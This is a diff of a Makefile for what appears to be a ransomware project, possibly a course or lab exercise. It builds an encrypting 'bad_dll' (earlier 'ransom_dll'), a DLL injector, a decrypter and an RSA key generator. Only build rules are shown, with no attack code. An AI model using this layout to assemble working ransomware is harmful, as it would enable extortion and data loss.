@@ -1,61 +1,57 @@
-# Compiler and flags
 CC = gcc
-CFLAGS = -Wall -Iinclude
-LDFLAGS = -lcrypto -lssl
-
-# Folders
-SRC_DIR = src
+# Directories
+SRC_DIR   = src
 BUILD_DIR = build
 
-# Source files
-SRC_RANSOM_DLL     = $(SRC_DIR)/ransom_dll.c
-SRC_RANSOM         = $(SRC_DIR)/ransom.c
-SRC_DLL_INJECTOR   = $(SRC_DIR)/dll_injector.c
-SRC_GET_DIR        = $(SRC_DIR)/get_dir.c
-SRC_DECRYPT        = $(SRC_DIR)/decrypt.c
-SRC_GENERATE_RSA   = $(SRC_DIR)/generate_rsa.c
+# Includes
+INC_DIR = include
+CFLAGS = -Wall -I$(SRC_DIR) -I$(INC_DIR)
 
-# Object files
-OBJ_GET_DIR        = $(BUILD_DIR)/get_dir.o
-OBJ_RANSOM         = $(BUILD_DIR)/ransom.o
+# Sources
+
+SRC_ATTACK_CRYPTO = $(SRC_DIR)/attack_crypto.c
+
+SRC_ATTACK        = $(SRC_DIR)/attack.c $(SRC_ATTACK_CRYPTO)
+
+GET_DIR_SRC      = $(SRC_DIR)/get_dir.c
+
+DLL_SRC          = $(SRC_DIR)/bad_dll.c $(SRC_DIR)/attack.c $(GET_DIR_SRC)
+
+INJECTOR_SRC     = $(SRC_DIR)/dll_injector.c $(GET_DIR_SRC)
+
+DECRYPT_SRC      = $(SRC_DIR)/decrypt.c $(GET_DIR_SRC)
+
+GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c
 
 # Targets
-RANSOM_DLL_TARGET   = $(BUILD_DIR)/ransom_dll.dll
-DLL_INJECTOR_TARGET = $(BUILD_DIR)/dll_injector.exe
-DECRYPT_TARGET      = $(BUILD_DIR)/decrypt.exe
-GENERATE_RSA_TARGET = $(BUILD_DIR)/generate_rsa.exe
 
-# Default target
-all: $(RANSOM_DLL_TARGET) $(DLL_INJECTOR_TARGET) $(DECRYPT_TARGET) $(GENERATE_RSA_TARGET)
+BAD_DLL      = $(BUILD_DIR)/bad_dll.dll
+INJECTOR_EXE = $(BUILD_DIR)/dll_injector.exe
+DECRYPT_EXE  = $(BUILD_DIR)/decrypt.exe
+RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe
 
-# Create build directory
+all: $(BAD_DLL) $(INJECTOR_EXE) $(DECRYPT_EXE) $(RSA_EXE)
+
+# Build directory
 $(BUILD_DIR):
 	mkdir -p $(BUILD_DIR)
 
-# Compile get_dir.o
-$(OBJ_GET_DIR): $(SRC_GET_DIR) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -c $< -o $@
+# DLL
 
-# Compile ransom.o
-$(OBJ_RANSOM): $(SRC_RANSOM) $(OBJ_GET_DIR) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -c $< -o $@
+$(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
+	$(CC) $(CFLAGS) -shared -o $@ $^
 
-# Build DLL
-$(RANSOM_DLL_TARGET): $(SRC_RANSOM_DLL) $(OBJ_RANSOM) $(OBJ_GET_DIR) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -shared -o $@ $^ $(LDFLAGS)
-	
-# Build dll_injector.exe
-$(DLL_INJECTOR_TARGET): $(SRC_DLL_INJECTOR) $(OBJ_GET_DIR) | $(BUILD_DIR)
+# EXEs
+
+$(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
 	$(CC) $(CFLAGS) -o $@ $^
 
-# Build decrypt.exe
-$(DECRYPT_TARGET): $(SRC_DECRYPT) $(OBJ_GET_DIR) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+$(DECRYPT_EXE): $(DECRYPT_SRC) | $(BUILD_DIR)
+	$(CC) $(CFLAGS) -o $@ $^ 
 
-# Build generate_rsa.exe
-$(GENERATE_RSA_TARGET): $(SRC_GENERATE_RSA) $(OBJ_GET_DIR) | $(BUILD_DIR)
-	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
+$(RSA_EXE): $(GENERATE_RSA_SRC) | $(BUILD_DIR)
+	$(CC) $(CFLAGS) -o $@ $^ 
 
-# Clean build artifacts
+# Clean
 clean:
-	del /Q $(BUILD_DIR)\*.exe $(BUILD_DIR)\*.dll $(BUILD_DIR)\*.o 2>nul || true
+	rm -f $(BUILD_DIR)/*.exe $(BUILD_DIR)/*.dll
